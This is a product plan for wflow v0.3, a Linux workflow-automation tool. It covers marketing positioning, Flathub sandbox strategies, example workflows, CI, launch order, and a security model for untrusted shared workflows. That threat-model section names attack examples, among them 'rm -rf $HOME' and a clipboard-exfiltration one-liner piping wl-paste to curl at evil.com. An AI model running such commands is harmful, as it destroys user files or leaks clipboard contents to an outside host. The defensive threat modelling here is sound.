# wflow v0.3 — leg-2 positioning + public launch

Source: CEO review on 2026-04-25 (`/plan-ceo-review`, SELECTIVE EXPANSION mode).
Survived 3 rounds of adversarial spec review (5/10 → 8/10 → 9/10).

## Premise

Honest read of the three audience legs as of v0.2.0:

1. **AutoHotkey-on-Wayland** — DORMANT. Input plumbing exists (libei Record backend, KDL key-down/up/mouse-down/up) but no trigger-mode daemon, no hotkey-binding UX. Competitors (Hawck, keymapper) own this audience; wflow is not a contender today.
2. **macOS Shortcuts on Linux (GUI-first)** — ACTIVE. GUI editor with mutation shipped in v0.2; Library, save, run, Record. Competitor: CrossMacro (already on Flathub). Currently 80% feature-comparable.
3. **Declarative shell scripts (KDL-first)** — ACTIVE. KDL language complete with vars/flow/includes/imports/retries/timeouts; CLI runner; cron-friendly. No direct competitor. Currently 95% complete.

**Decision: leg 2 as the marketing headline.** Leg 3 stays functional (KDL is the substrate); leg 1 stays dormant. Positioning commitment, not a code-stripping commitment.

**Implication.** GUI must be polished, must ship on Flathub, must be the dominant install path. Comparison to CrossMacro is now unavoidable — wflow needs a *named* defensible dimension, not vibes. The strongest candidate: **workflows-as-files** — wflow workflows are version-controllable, diffable, hand-authorable, includable into other workflows, and shareable as plain text. CrossMacro stores workflows in a binary/proprietary format that can't be diffed or shared cleanly. That's the defensible angle. Secondary: declarative > record-replay (declarative survives UI changes; recordings break).

## Flathub spike (P0 — must resolve before committing to manifest)

The load-bearing question: **wflow runs arbitrary shell commands. Flathub sandboxes by default forbid this.** Without a strategy, the GUI on Flathub becomes a workflow viewer that can't run workflows — leg-2 positioning is dead on arrival.

Three plausible strategies:

1. **`--talk-name=org.freedesktop.Flatpak` host-spawn permission.** wflow asks the host to run shell on its behalf via the Flatpak portal. Some apps do this (VSCode, Boxes). Pros: shell actions Just Work. Cons: review risk, prompt on first shell run.
2. **Bundle a minimal shell + utilities inside the sandbox.** Pros: clean review profile. Cons: workflows can't reach host PATH (no firefox, no system commands) — kills the use case.
3. **Document Flathub install as `--filesystem=host --talk-name=...` install-time permissions.** Honest-but-permissive. Pros: clearest contract with users. Cons: Flathub may reject as overly broad.

Plus parallel questions: how to package wdotool (host-installed prereq vs bundled vs bundled-but-disabled), Qt6 BaseApp version, freedesktop SDK version (24.08 likely), portal permissions list (RemoteDesktop for Record Mode, Notifications for `notify` action, SpiceClient for clipboard).

**Decision rule.** Run the spike in the first session of v0.3. If strategy 1 looks viable, proceed with Flathub commitment. If strategy 1 is rejected and strategy 3 is too permissive for review, **demote Flathub to a stretch goal** and commit to AUR-only distribution this cycle. The leg-2 positioning still works for Arch users; broader desktop-Linux distribution slips to v0.4.

## Example workflow specification

The 5-7 examples in `examples/` should be real, demonstrate KDL's full expressiveness, and each have a one-paragraph README explaining the use case. Initial list (final selection during v0.3):

1. **`dev-setup.kdl`** — open editor + dev terminal + browser tabs + tile windows for a project. Showcases shell + key + focus + delay.
2. **`screenshot-and-share.kdl`** — grim → wl-copy → notify. Showcases shell capture + clipboard + notify.
3. **`daily-standup.kdl`** — open Slack → focus channel → paste prepared message. Showcases imports/use for the message template.
4. **`loop-tab-thru.kdl`** — repeat block of `key "ctrl+tab"` N times to cycle through browser tabs. Showcases `repeat`.
5. **`if-vpn-then.kdl`** — `when env="VPN_ACTIVE"` block. Showcases conditional.
6. **`flaky-deploy-trigger.kdl`** — `shell "deploy.sh" retries=3 backoff="5s" timeout="2m"`. Showcases shell resilience features.
7. **`record-replay-export.kdl`** — example output from Record Mode showing what coalescing does. Showcases the recorder's actual output format.

Each example must work as-shipped — a CI job runs `wflow validate examples/*.kdl` on every commit.

## Security model — shareable + executable workflows

Threat: someone downloads `stranger.kdl`, runs `wflow run` on it, arbitrary shell executes. This is a footgun. v0.3 ships a minimal-but-real story:

1. **First-run prompt for untrusted workflows.** If a `.kdl` file wasn't created by `wflow new` on this machine, `wflow run` prints a summary of the shell commands it will execute and prompts confirmation. `--yes` flag overrides for cron use. GUI shows a "review steps" view by default.
   - **Fingerprint mechanism**: maintain `~/.config/wflow/trusted_workflows` — on `wflow new` and on user-confirmed `wflow run` of an untrusted file, append the file's absolute path + a SHA-256 of its content.
   - Re-prompt on content change (legitimate edits cost one extra confirmation; trade-off accepted).
   - Cloned-into-new-machine case re-prompts once, which is the desired behavior for "ran someone else's workflow."
2. **Reinforce existing safety tools.** `wflow show <path>` and `wflow run --explain` already exist. Reinforce in the README and first-run flow that `--explain` is the safety check.
3. **Don't add cryptographic signing yet** (premature). Just ensure the user has seen the commands before they run.
4. **Document attack vectors** in `REVIEW.md`: obvious (`rm -rf $HOME`), subtle (clipboard exfiltration via `wl-paste | curl evil.com -d @-`), social (workflow named "fix-firefox" that does something else).

## CI / release automation

Currently zero. Every release is hand-rolled. v0.3 adds:

1. **GitHub Actions: build + test on every push** (runs `cargo test`, `cargo build --release`).
2. **Release workflow on tag push** — builds the x86_64 tarball + computes sha256 + uploads to GitHub Release as draft. Removes the manual tarball-building done in v0.2.
3. **PKGBUILD validation in CI** — `bash -n` on both PKGBUILDs always; sha256-check is conditional. The release workflow (#2) produces the tarball before PKGBUILD validation runs, so the validation job depends on `release` and uses the just-built artifact, not a prior tag's tarball. On the *first* release post-public-flip, skip the sha256 step. All subsequent releases validate the wflow PKGBUILD's `sha256sums` against the tarball it points to.

4. **Telemetry / phone-home** — **DEFERRED to v0.4 explicitly.** Rely on metric in #2. Revisit if issue volume after 90 days is too low to read signal from.

## Distribution / launch sequencing

Order matters. Don't bundle these into one push:

1. **Pre-public:** Flathub sandbox spike. Outcome determines whether Flathub stays in v0.3.
2. **Pre-public:** Security model — first-run confirmation prompt for unfamiliar workflows.
3. **Pre-public:** README rewrite + positioning + `examples/` directory (commit before flipping repo public).
4. **Pre-public:** CI pipeline (build + test on push).
5. **Public flip** (single isolated change).
6. **AUR push** (same-day if the in-tree PKGBUILDs are clean; defer 1-2 days only if the public flip surfaces immediate issues).
7. **Release workflow on tag** (build + draft GitHub release automatically going forward).
8. **Coalescing** (independent feature work; can run in parallel with all distribution work).
9. **Flathub submission** (only if spike from #1 was viable; review cycle takes days/weeks).
